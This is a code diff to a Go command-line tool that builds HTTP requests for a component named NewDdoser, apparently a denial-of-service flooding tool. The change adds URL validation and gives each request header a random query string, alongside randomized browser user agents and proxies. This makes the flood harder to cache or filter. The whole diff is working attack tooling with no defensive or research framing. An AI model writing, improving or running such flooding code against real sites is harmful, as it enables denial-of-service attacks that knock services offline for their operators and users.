@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"net/url"
 	"time"
 
@@ -36,8 +37,8 @@ var runCommand = &console.Command{
 	Action: func(c *console.Context) error {
 		u, err := url.ParseRequestURI(c.String("url"))
 
-		if err != nil {
-			return err
+		if err != nil || u.Hostname() == "" || u.Port() == "" {
+			return fmt.Errorf("invalid URL")
 		}
 
 		headers := make([]string, 100)
@@ -48,19 +49,19 @@ var runCommand = &console.Command{
 
 		spinner.Start()
 		var h fasthttp.RequestHeader
-		h.SetRequestURI(u.RequestURI())
 		h.SetMethod("GET")
 		h.SetHost(u.Host)
 		h.Set("Connection", "keep-alive")
 
 		for i := range headers {
+			h.SetRequestURI(u.RequestURI() + `?` + randomString(5) + `=` + randomString(32))
 			h.SetUserAgent(browser.Random())
 			headers[i] = h.String()
 			time.Sleep(time.Millisecond * 10)
 		}
 		spinner.Stop()
 
-		ddoser, err := NewDdoser(c.String("url"), c.Int("worker"), headers, proxies)
+		ddoser, err := NewDdoser(u, c.Int("worker"), headers, proxies)
 
 		if err != nil {
 			return err
